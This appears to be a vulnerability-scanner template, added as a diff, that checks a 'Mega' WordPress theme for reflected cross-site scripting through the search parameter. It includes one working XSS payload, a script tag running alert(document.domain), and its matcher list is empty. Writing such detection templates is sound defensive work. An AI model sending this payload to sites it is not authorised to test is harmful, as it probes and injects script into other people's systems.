@@ -1,0 +1,18 @@
+id: wp-mega-theme
+brief:
+    title: Mega Wordpress Theme - Cross site scripting
+    by: r3Y3r53
+    level: medium
+    about: WordPress theme with a 'Mega-Theme' design is vulnerable to a reflected XSS attack through the '?s=' parameter.
+    label:
+        - wp
+        - wp-theme
+        - wordpress
+        - xss
+        - mega
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/?s=%22%3E%3Cscript%3Ealert(`document.domain`)%3C/script%3E'
+      signs: []
